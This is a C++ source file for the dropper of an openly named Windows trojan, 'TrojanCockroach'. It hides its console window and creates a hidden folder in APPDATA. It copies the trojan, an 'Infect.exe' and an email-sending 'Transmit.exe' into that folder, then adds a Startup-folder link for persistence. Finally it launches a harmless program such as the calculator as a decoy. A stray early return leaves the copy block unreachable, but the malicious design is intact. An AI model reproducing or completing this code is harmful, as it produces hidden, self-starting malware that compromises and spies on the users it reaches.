/**
* Developer: Minhas Kamal (BSSE-0509, IIT, DU)
* Date: 28.Sep.15
**/

#define FOLDER_NAME "trojanCockroach"  //containing folder
#define RUN_FILE_NAME "TrojanCockroach.exe"  //main run file
#define RUN_LINK_NAME "TrojanCockroach.lnk"  //starter link
#define INFECT_FILE_NAME "Infect.exe"  //infects computer
#define INFECT_LINK_NAME "Infect.lnk"  //link file
#define EMAIL_SENDER_FILE_NAME "Transmit.exe"  //email sender

#include <windows.h>
#include <string>
#include <time.h>

main(){
    FreeConsole();  //window is not visible

    char* appdataFolder = getenv("APPDATA");

    char folderPath[100] = {""};
    strcat(folderPath, appdataFolder);
    strcat(folderPath, "\\");
    strcat(folderPath, FOLDER_NAME);

    if(CreateDirectory(folderPath ,NULL))    //if directory creation does not fail
    {
        SetFileAttributes(folderPath, FILE_ATTRIBUTE_HIDDEN);
        return; // :)

        ///////////////////////////
        char run[100]={""};
        strcat(run, folderPath);
        strcat(run, "\\");
        strcat(run, RUN_FILE_NAME);

        char run_from[100]={""};
        strcat(run_from, FOLDER_NAME);
        strcat(run_from, "\\");
        strcat(run_from, RUN_FILE_NAME);

        CopyFile(run_from, run, 0);

        ///////////////////////////
        char net[100]={""};
        strcat(net, folderPath);
        strcat(net, "\\");
        strcat(net, EMAIL_SENDER_FILE_NAME);

        char net_from[100]={""};
        strcat(net_from, FOLDER_NAME);
        strcat(net_from, "\\");
        strcat(net_from, EMAIL_SENDER_FILE_NAME);

        CopyFile(net_from, net, 0);

        //////////////////////////
        char infect[100]={""};
        strcat(infect, folderPath);
        strcat(infect, "\\");
        strcat(infect, INFECT_FILE_NAME);

        char infect_from[100]={""};
        strcat(infect_from, FOLDER_NAME);
        strcat(infect_from, "\\");
        strcat(infect_from, INFECT_FILE_NAME);

        CopyFile(infect_from, infect, 0);

        //////////////////////////
        char runlnk[100]={""};
        strcat(runlnk, folderPath);
        strcat(runlnk, "\\");
        strcat(runlnk, RUN_LINK_NAME);

        char runlnk_from[100]={""};
        strcat(runlnk_from, FOLDER_NAME);
        strcat(runlnk_from, "\\");
        strcat(runlnk_from, RUN_LINK_NAME);

        CopyFile(runlnk_from, runlnk, 0);

        ///////////////////////////
        char infectlnk[100]={""};
        strcat(infectlnk, folderPath);
        strcat(infectlnk, "\\");
        strcat(infectlnk, INFECT_LINK_NAME);

        char infectlnk_from[100]={""};
        strcat(infectlnk_from, FOLDER_NAME);
        strcat(infectlnk_from, "\\");
        strcat(infectlnk_from, INFECT_LINK_NAME);

        CopyFile(infectlnk_from, infectlnk, 0);

        /////////////////////////////////////////////////////////
        char tasklnkauto[100] = {""};
        strcat(tasklnkauto, appdataFolder);
        strcat(tasklnkauto, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\cockroach.lnk");

        CopyFile(runlnk_from, tasklnkauto, 0);
        //SetFileAttributes(tasklnkauto, FILE_ATTRIBUTE_HIDDEN);
    }


    srand(time(0));
    int random = rand();

    if(random%5 == 0){
        system("start taskmgr /Performance");
    }else if(random%3 == 0){
        system("start diskmgmt");
    }else if(random%2 == 0){
        system("start perfmon /res");
    }else{
        system("start calc");
    }
}
